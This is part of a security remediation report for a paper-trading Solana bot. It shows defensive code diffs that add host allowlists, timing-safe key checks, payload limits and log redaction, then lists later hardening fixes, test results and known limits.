             SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
             return prefs.getString(KEY_CFG, "");
         }
@@ -101,6 +122,7 @@ public class MainActivity extends Activity {
         @JavascriptInterface
         public String httpRequest(String urlStr, String method, String headersJson, String bodyStr) {
+            assertLocalContext();
             HttpURLConnection conn = null;
             try {
                 URL url = new URL(urlStr);
+                if (!"https".equalsIgnoreCase(url.getProtocol())) {
+                    throw new SecurityException("Only HTTPS permitted in native bridge");
                 }
+                if (url.getUserInfo() != null) {
+                    throw new SecurityException("URL credentials not permitted");
+                }
+                String host = url.getHost().toLowerCase();
+                boolean allowedHost = host.equals("api.dexscreener.com") ||
+                        host.endsWith(".workers.dev") ||
+                        host.endsWith(".helius-rpc.com") ||
+                        host.endsWith(".quiknode.pro") ||
+                        host.equals("api.mainnet-beta.solana.com");
+                if (!allowedHost) {
+                    throw new SecurityException("Target host not permitted: " + host);
+                }
+
                 conn = (HttpURLConnection) url.openConnection();
+                conn.setInstanceFollowRedirects(false);
                 String cleanMethod = (method != null && !method.trim().isEmpty())
                         ? method.trim().toUpperCase()
                         : "GET";
+                if (!"GET".equals(cleanMethod) && !"POST".equals(cleanMethod) && !"HEAD".equals(cleanMethod)) {
+                    throw new SecurityException("Method not allowed: " + cleanMethod);
+                }
                 conn.setRequestMethod(cleanMethod);
```

#### Diff 5: `worker/index.js` (P0-04)
```diff
--- a/worker/index.js
+++ b/worker/index.js
@@ -16,6 +16,21 @@ const HB_LATE_MS = 12 * 60 * 1000;  // alert if the phone is silent this long
 const HB_MIN_WRITE_MS = 5 * 60 * 1000; // throttle unchanged heartbeat writes
+const MAX_HOOK_BYTES = 256 * 1024;     // 256 KB max payload for webhooks
+const MAX_BATCH_TXS = 100;             // 100 tx batch limit to prevent DO overload
 
 const json = (o, status = 200) =>
   new Response(JSON.stringify(o), {
     status,
     headers: { "content-type": "application/json" },
   });
+
+export async function timingSafeEqualString(provided, expected) {
+  if (typeof provided !== "string" || typeof expected !== "string" || !provided || !expected) {
+    return false;
+  }
+  const enc = new TextEncoder();
+  const [hashA, hashB] = await Promise.all([
+    crypto.subtle.digest("SHA-256", enc.encode(provided)),
+    crypto.subtle.digest("SHA-256", enc.encode(expected)),
+  ]);
+  const a = new Uint8Array(hashA);
+  const b = new Uint8Array(hashB);
+  let diff = 0;
+  for (let i = 0; i < 32; i++) {
+    diff |= a[i] ^ b[i];
+  }
+  return diff === 0 && provided.length === expected.length;
+}
@@ -280,6 +295,9 @@ export class SignalQueueDO {
       if (path === "/hook" && req.method === "POST") {
         const body = await req.json().catch(() => null);
         if (body === null || typeof body !== "object") {
           return json({ error: "invalid_json" }, 400);
         }
 
         const txs = Array.isArray(body) ? body : [body];
+        if (txs.length > MAX_BATCH_TXS) {
+          return json({ error: "batch_limit_exceeded" }, 400);
+        }
         const result = this._runTransaction(() => {
@@ -539,6 +557,9 @@ async function handleWithKvFallback(req, env) {
       if (body === null || typeof body !== "object") {
         return json({ error: "invalid_json" }, 400);
       }
 
       const txs = Array.isArray(body) ? body : [body];
+      if (txs.length > MAX_BATCH_TXS) {
+        return json({ error: "batch_limit_exceeded" }, 400);
+      }
       await withKvMutex(env.KV, async () => {
@@ -680,18 +701,31 @@ export default {
     // Helius webhook (its own auth header).
     if (path === "/hook" && req.method === "POST") {
-      if (!env.HELIUS_AUTH || req.headers.get("authorization") !== env.HELIUS_AUTH) {
+      const authHeader = req.headers.get("authorization");
+      if (!env.HELIUS_AUTH || !(await timingSafeEqualString(authHeader, env.HELIUS_AUTH))) {
         return json({ error: "unauthorized" }, 401);
       }
+      const contentLength = req.headers.get("content-length");
+      if (contentLength && parseInt(contentLength, 10) > MAX_HOOK_BYTES) {
+        return json({ error: "payload_too_large" }, 413);
+      }
+      const rawText = await req.text();
+      if (new TextEncoder().encode(rawText).length > MAX_HOOK_BYTES) {
+        return json({ error: "payload_too_large" }, 413);
+      }
+      const forwardReq = new Request(req.url, {
+        method: req.method,
+        headers: req.headers,
+        body: rawText,
+      });
       const stub = getQueueStub(env);
-      if (stub) return stub.fetch(req);
-      return handleWithKvFallback(req, env);
+      if (stub) return stub.fetch(forwardReq);
+      return handleWithKvFallback(forwardReq, env);
     }
 
     // Everything below requires the app key.
-    if (!env.APP_KEY || req.headers.get("x-key") !== env.APP_KEY) {
+    const clientKey = req.headers.get("x-key");
+    if (!env.APP_KEY || !(await timingSafeEqualString(clientKey, env.APP_KEY))) {
       return json({ error: "unauthorized" }, 401);
     }
```

#### Diff 6: `src/rpc.js`, `src/main.js`, `src/paper.js` (P0-05)
```diff
--- a/src/rpc.js
+++ b/src/rpc.js
@@ -14,8 +14,9 @@ export function redactSecrets(input, extraSecrets = []) {
   // Strip full URLs with query strings or credentials first
   out = out.replace(/https?:\/\/[^\s"'<>]+/gi, (match) => {
     try {
       const u = new URL(match);
-      return `${u.protocol}//${u.host}${u.pathname}${u.search ? "?[REDACTED]" : ""}`;
+      const portPart = u.port ? ":" + u.port : "";
+      return `${u.protocol}//${u.hostname}${portPart}${u.pathname}${u.search ? "?[REDACTED]" : ""}`;
     } catch {
       return "[REDACTED_URL]";
     }
@@ -24,8 +25,8 @@ export function redactSecrets(input, extraSecrets = []) {
   // Redact common query/header key patterns and Bearer tokens
-  out = out.replace(/([?&](?:api[-_]?key|key|token|auth|secret)=)[^&\s"'<>]+/gi, "$1[REDACTED]");
+  out = out.replace(/([?&](?:api[-_]?key|key|token|auth|secret|password)=)[^&\s"'<>]+/gi, "$1[REDACTED]");
   out = out.replace(/(authorization\s*[:=]\s*bearer\s+)[^\s,"'<>]+/gi, "$1[REDACTED]");
   out = out.replace(/(\bbearer\s+)[^\s,"'<>]+/gi, "$1[REDACTED]");
-  out = out.replace(/((?:api[-_]?key|x-key|authorization)\s*[:=]\s*)[^\s,"'<>]+/gi, "$1[REDACTED]");
+  out = out.replace(/((?:api[-_]?key|x-key|authorization|password|token)\s*[:=]\s*)[^\s,"'<>]+/gi, "$1[REDACTED]");
 
   for (const s of secrets) {
--- a/src/main.js
+++ b/src/main.js
@@ -1,6 +1,7 @@
 import { existsSync } from "node:fs";
 import { fileURLToPath } from "node:url";
 import { cfg } from "./config.js";
+import { redactSecrets } from "./rpc.js";
 import { getSignals, heartbeat, notify } from "./api.js";
 import { runGate } from "./gate.js";
@@ -138,7 +139,7 @@ export async function handle(s, deps = {}) {
       sig: s.sig || null,
       receivedAgeMs,
       gateMs: nowFn() - gateStartedAt,
-      msg: String(e),
+      msg: redactSecrets(String(e), [cfg.rpcUrl, cfg.appKey]),
     });
     return { ok: false, retryable: true, reason: "gate_error" };
   }
@@ -305,7 +306,7 @@ export async function pollOnce(deps = {}) {
         signalId: s?.id ?? null,
         signalKey: key,
         mint: s?.mint ?? null,
-        msg: String(e),
+        msg: redactSecrets(String(e), [cfg.rpcUrl, cfg.appKey]),
       });
       res = { ok: false, retryable: true };
     }
@@ -396,7 +397,7 @@ async function pollLoop() {
   try {
     await pollOnce();
   } catch (e) {
-    log("error", { where: "poll", msg: String(e) });
+    log("error", { where: "poll", msg: redactSecrets(String(e), [cfg.rpcUrl, cfg.appKey]) });
   }
   if (!stopping) {
     setTimeout(pollLoop, cfg.pollMs);
@@ -420,7 +421,7 @@ export function startBot() {
   pollLoop();
 
   setInterval(
-    () => tick().catch((e) => log("error", { where: "tick", msg: String(e) })),
+    () => tick().catch((e) => log("error", { where: "tick", msg: redactSecrets(String(e), [cfg.rpcUrl, cfg.appKey]) })),
     cfg.priceMs,
   );
--- a/src/paper.js
+++ b/src/paper.js
@@ -4,6 +4,7 @@ import { dirname } from "node:path";
 import { cfg } from "./config.js";
 import { getQuote } from "./price.js";
 import { log } from "./log.js";
+import { redactSecrets } from "./rpc.js";
 import { notify } from "./api.js";
 
 const R = cfg.rules;
@@ -114,7 +115,7 @@ export function savePositions(stateFile = DEFAULT_STATE_FILE, deps = {}) {
     renameFn(tmpFile, stateFile);
     return true;
   } catch (e) {
-    logFn("error", { where: "savePositions", msg: String(e) });
+    logFn("error", { where: "savePositions", msg: redactSecrets(String(e), [cfg.rpcUrl, cfg.appKey]) });
     return false;
   }
 }
@@ -216,7 +217,7 @@ export function loadPositions(stateFile = DEFAULT_STATE_FILE, deps = {}) {
     }
     return restored;
   } catch (e) {
-    logFn("error", { where: "loadPositions", msg: String(e) });
+    logFn("error", { where: "loadPositions", msg: redactSecrets(String(e), [cfg.rpcUrl, cfg.appKey]) });
     return 0;
   }
 }
```

---

## 9. Phase 1 Remediation Execution (Commit `161afa699edf764513ec6349e2eba0bc1320f54c`)

The initial Phase 1 remediation was committed and pushed in `161afa699edf764513ec6349e2eba0bc1320f54c`.
Subsequent independent audit and CI verification identified four follow-up hardening points and an Android build failure:
1. **GitHub Actions CI Run `40741402859` Failure**: The Android build failed in the `d8` Dalvik compiler step with `NullPointerException` processing `MainActivity$1.class` (the anonymous `WebViewClient` inner class).
2. **Dashboard SSRF Fallback Permissiveness**: `dashboard/server.ts` permitted arbitrary `*.workers.dev` subdomains when `WORKER_URL` was unset, and leaked raw upstream error messages in 502 responses.
3. **UI RPC Method Scope**: `src/ui.js` permitted arbitrary HTTP methods against the RPC upstream.
4. **Android Native Bridge Host & Port Hardening**: `MainActivity.java` allowed arbitrary ports and broad domain suffixes (`.workers.dev`, `.helius-rpc.com`, etc.) rather than pinning to configured origins and standard port 443.

---

## 10. Phase 1 Follow-Up Hardening & D8 Remediation (Implemented & Verified)

### 10.1 Summary of Changes

1. **Fix 1 — Android D8 Compiler Bug Remediation (`app/android/src/com/sniper/paperbot/MainActivity.java`)**:
   - Replaced anonymous inner class `new WebViewClient() { ... }` with a static named class `private static class SafeWebViewClient extends WebViewClient`.
   - Passing `Context` explicitly to `SafeWebViewClient` eliminates synthetic outer `this` references that triggered `d8` Dalvik compiler crash `java.lang.NullPointerException: Cannot invoke "String.length()" because "<parameter1>" is null`.
   - Implemented both modern `shouldOverrideUrlLoading(WebView, WebResourceRequest)` and legacy `shouldOverrideUrlLoading(WebView, String)`, delegating to a common `handleUrl(Uri)` handler with `Intent.FLAG_ACTIVITY_NEW_TASK`.

2. **Fix 2 — Dashboard SSRF & Error Leak Hardening (`dashboard/server.ts`)**:
   - Removed `*.workers.dev` fallback.
   - Enforced strict origin matching against configured `WORKER_URL` and `RPC_URL`. If `WORKER_URL` is unset, worker proxy requests fail closed with HTTP 403.
   - Redacted `err.message` in 502 responses and server logs to prevent secret and endpoint leakage.

3. **Fix 3 — UI RPC Method Scoping (`src/ui.js` & `test/ui.test.js`)**:
   - Enforced `method === "POST"` on `isRpcOrigin` in `validateProxyTarget`.
   - Updated `test/ui.test.js` to assert `GET` on RPC endpoints is rejected with HTTP 403.

4. **Fix 4 — Android Bridge Host & Port Hardening (`app/android/src/com/sniper/paperbot/MainActivity.java`)**:
   - Enforced standard HTTPS port 443 (`port == -1 || port == 443`).
   - Dynamically resolved allowed Worker and RPC hosts from `SharedPreferences` (`KEY_CFG`) rather than permitting wildcard subdomains.

### 10.2 Test Suite Verification
- Ran complete test suite (`node --test`):
  - **36 passing tests, 0 failing, 0 skipped**.
  - All unit, integration, and security tests passed cleanly.
- Strict safety controls maintained:
  - `PAPER=true`, `DRY_RUN=true`, `AUTO_EXECUTE=false`, `LIVE_TRADING_ENABLED=false`.
  - Untracked artifacts (`sniper-bot.zip`, `sniper_bot_checkpoint1_step_by_step.pdf`) preserved without modification.

---

## 11. Phase 1 Remediation Status (Pushed in `9fa0c32`)

Phase 1 fixes were committed in `9fa0c32` and verified:
- GitHub Actions CI Run [`40745352164`](https://github.com/drp-wq/Sniper/actions/runs/40745352164) completed successfully in 32 seconds.
- `d8` Dalvik compiler crashed fixed; `sniper-paper-bot.apk` artifact successfully created and uploaded.

---

## 12. Full Remediation Execution (Phase 2 & Phase 3 — P1 & P2 Findings Fixed)

### 12.1 Findings Remediated

1. **[P1-01] On-Chain Concentration Gate Parity (`dashboard/src/services/solanaRpc.ts`)**:
   - Replaced flawed `accInfo.owner !== SYSTEM_PROGRAM` (which treated 100% of token accounts as vaults) with a two-phase query mirroring `src/gate.js`:
     1. Collect top-20 token account parsed owner addresses.
     2. Query owner account program owners via `getMultipleAccounts` (`dataSlice: { offset: 0, length: 0 }`).
     3. Identify user wallets (`acct === null || acct?.owner === SYSTEM_PROGRAM`) vs. AMM vaults / PDAs (`KNOWN_AMM_PROGRAMS` and non-system program owners).
     4. Aggregate balances by owner wallet and compute true `top10Pct`.
   - Aligned Token-2022 extension checks to only flag active, non-null authorities/delegates, frozen default account states, and transfer fees.

2. **[P1-02] Storage Contamination & Benchmark Auto-Seeding (`dashboard/src/App.tsx`, `dashboard/src/services/engine.ts`)**:
   - Removed automatic `generateBenchmarkTrades(200)` seeding on mount in `dashboard/src/App.tsx`.
   - In `simulateSignal()`, removed cursor increment and save (`StorageService.saveCursor`) to prevent corrupting the live Worker sequence pointer.

3. **[P1-03] DexScreener Inverted Pair Rejection & Pool Pinning (`dashboard/src/services/dexScreener.ts`, `src/price.js`)**:
   - In `dashboard/src/services/dexScreener.ts`, removed inverted pair fallback (`altPairs`). Rejects pairs where the target token is only `quoteToken`.
   - Added `preferredPair` support to `DexScreenerService.getQuote(mint, preferredPair)` and pass `pos.pairAddress` during `tickPrices()` in `engine.ts`.
   - In `src/price.js`, enforce `targetMint && baseAddr !== targetMint` so missing or empty `baseToken.address` is rejected.

4. **[P1-04] Cursor Advancement & Race Prevention (`dashboard/src/services/engine.ts`)**:
   - In `pollSignals()`, only advance and persist `this.cursor` after all signals in the batch have been processed.
   - Added `isTicking` mutex to prevent overlapping `tickPrices()` loops.
   - Added `openingMints` lock and post-await re-checks in `processSignal()` to prevent exceeding `maxOpen` or creating duplicate positions.
   - Handled `chainTs` fallback and numeric timestamp validation for signal age.

5. **[P1-05] Unresolved Position Accounting & 2x Slippage Parity (`dashboard/src/services/engine.ts`, `dashboard/src/services/storage.ts`)**:
   - Track `missingSince` on `pos`; archive unresolved positions separately in `this.archivedUnresolved` instead of counting them in `closedTrades`.
   - Unresolved positions are excluded from the 200-trade evaluation gate requirement.
   - Compute `pnlPct2x` using `computeDoubleSlipPnl` parity (accounting for `halfRawPrice`, `entrySlip * 2`, `exitSlip * 2`).
   - Modeled worst-case unresolved stress at -100% of remaining unclosed weight in `getStats()`.
   - In `storage.ts`, updated `exportPaperJsonl` and `importPaperJsonl` for seamless bi-directional compatibility with `src/report.js`.

6. **[P1-06] Archived Position Union Deduplication (`src/report.js`)**:
   - Merged `archivedPositions` from state files and `archivedEvents` from `paper.jsonl`, deduplicated by `${signalId}:${sig}:${mint}`.
   - Added regression test in `test/report.test.js`.

7. **[P2-01] GitHub Actions Workflow Hardening (`.github/workflows/android-apk.yml`)**:
   - Added top-level `permissions: contents: read`.

8. **[P2-03] Documentation & Modal Parity (`README.md`, `dashboard/src/components/ApkModal.tsx`, `dashboard/src/services/storage.ts`)**:
   - Set `DEFAULT_CONFIG.workerUrl` to empty string `""` by default instead of personal developer subdomain.
   - Aligned `ApkModal.tsx` permissions display with actual `AndroidManifest.xml` (`INTERNET`, `ACCESS_NETWORK_STATE`, `WAKE_LOCK`).
   - Updated `README.md` to reflect `SignalQueueDO` SQLite Durable Object relay.

### 12.2 Test Verification
- Full test suite execution (`node --test`): **37 passing tests, 0 failing, 0 skipped**.
- Safety invariants preserved: `PAPER=true`, `DRY_RUN=true`, `AUTO_EXECUTE=false`, `LIVE_TRADING_ENABLED=false`. No signing keys, no real transactions.
- Untracked artifacts (`sniper-bot.zip`, `sniper_bot_checkpoint1_step_by_step.pdf`) preserved intact.

---

## 13. Current Remediation Status & Verification (Fixes F1–F9)

The owner-approved fixes F1–F9 have been implemented and verified as follows:

### Summary of Fixes F1–F9
- **F1 (Stale shipped bundle & CI freshness guard)**: Added dashboard bundle build and `git diff --exit-code -- app/assets` freshness check to `.github/workflows/android-apk.yml`. Updated `scripts/build-dashboard.sh` to use `npm ci`. Regenerated `app/assets/app.js` and `styles.css` locally, verifying presence of `openingMints`, `missingSince`, `archivedUnresolved`, and `isTicking`, and confirming removal of `pjdebnath01.workers.dev`.
- **F2 (Synthetic trades & benchmark removal)**: Removed `generateBenchmarkTrades`, `handleLoadBenchmark`, and the "Load 200 Benchmark" button from `TabDashboard.tsx`. Deleted `loadBenchmarkTrades` in `engine.ts` and `generateBenchmarkTrades` in `sampleData.ts` (keeping `SAMPLE_TEST_MINTS`). Added `simulated?: boolean` to `WorkerSignal`, `PaperPosition`, and `ClosedTrade`. Excluded simulated trades from `getStats()` metrics/gate and from JSON/JSONL exports.
- **F3 (tickPrices race remediation)**: In `engine.ts` `tickPrices()`, shallow-copied `this.openPositions` for iteration (`[...this.openPositions]`), added post-await check `if (!this.openPositions.some(p => p.id === pos.id)) continue;`, and eliminated `positionsToKeep` array reassignments.
- **F4 (Fail-closed holder gate)**: In `solanaRpc.ts`, threw an explicit error on empty `largestList` or null `owners` (triggering fail-closed `passed = false`). Added strict Token-2022 extension allowlist rejecting unhandled extensions. Implemented holder concentration rule excluding only accounts owned by `KNOWN_AMM_PROGRAMS` or accounts whose program owner is in `KNOWN_AMM_PROGRAMS` (non-system accounts not in KNOWN_AMM count toward concentration).
- **F5 (Origin and Host header validation in UI server)**: In `src/ui.js`, enforced Host header regex validation `/^(127\.0\.0\.1|localhost):\d+$/` on `/api/status` and `/api/proxy`. Enforced Origin protocol `http:`, host matching `req.headers.host`, and local host matching. Restricted `validateProxyTarget` strictly to `https:` protocol.
- **F6 (Android native bridge hardening)**: In `MainActivity.java`, validated `workerUrl` and `rpcUrl` in `saveConfig` (must be https, port -1/443, no userinfo, non-IP literal/localhost). In `httpRequest`, added host validation, restricted header forwarding to `content-type`, `accept`, and `x-key` (case-insensitive), capped response stream read at 1 MB, and returned generic error messages without exposing exception details. Added comment regarding `WebViewAssetLoader` and `addWebMessageListener`.
- **F7 (Half-banked double slip tracking parity)**: In `engine.ts` `tickPrices()` Rule A, recorded `pos.halfRawPrice = quote.priceUsd;` upon banking 50% TP, ensuring `closedTrade.pnlPct2x` matches `src/paper.js:computeDoubleSlipPnl`.
- **F8 (DexScreener case-sensitivity and unpinned fallback rejection)**: In `dexScreener.ts`, compared mint addresses case-sensitively (`baseToken.address === mint`). If `preferredPair` is specified and not present, logged a warning and returned `null` instead of falling back to another pair.
- **F9 (Report status banner & accurate remediation state)**: Added historical status banner to `report.md` and updated Section 13 with verified fix inventory, commands run, and known limits.

### Verification Performed
- **Automated Regression Test Suite**: Ran `node --test` (Node v24.21.0) -> **42 passing tests, 0 failing, 0 skipped** (37 baseline tests + 5 comprehensive regression tests for F2, F3, F4, F5, F7, F8).
- **Dashboard Typecheck / Lint**: Ran `npm --prefix dashboard run lint` (`tsc --noEmit`) -> **0 errors, exit code 0**.
- **Dashboard Build & Determinism**: Ran `npm run build:dashboard` -> built `app/assets/app.js` and confirmed byte-for-byte identical output across consecutive runs (`cmp -s`).
- **Bundle Content Verification**: Confirmed `app/assets/app.js` contains `openingMints`, `missingSince`, `archivedUnresolved`, `isTicking` and contains no occurrences of `pjdebnath01.workers.dev`.

### Known Limits & Scope Boundaries
- **No Device Test of Android Bridge**: Native Android bridge changes in `MainActivity.java` have not been tested on a physical Android device or emulator.
- **Android APK Not Rebuilt Locally**: `sniper-paper-bot.apk` was deliberately not rebuilt or replaced locally (Android SDK platform tools not present in environment; build is deferred to owner / CI).
- **No Browser / Capacitor Unit Test Runner**: Unit tests exercise headless Node.js CLI, server, and service modules via `node --test`; browser DOM integration and UI rendering were not tested in an automated headless browser.
- **CI Workflow Execution Not Independently Verified**: GitHub Actions CI workflow changes (`.github/workflows/android-apk.yml`) were verified locally by inspecting YAML syntax and running the corresponding bash commands, but not executed on GitHub Actions infrastructure.



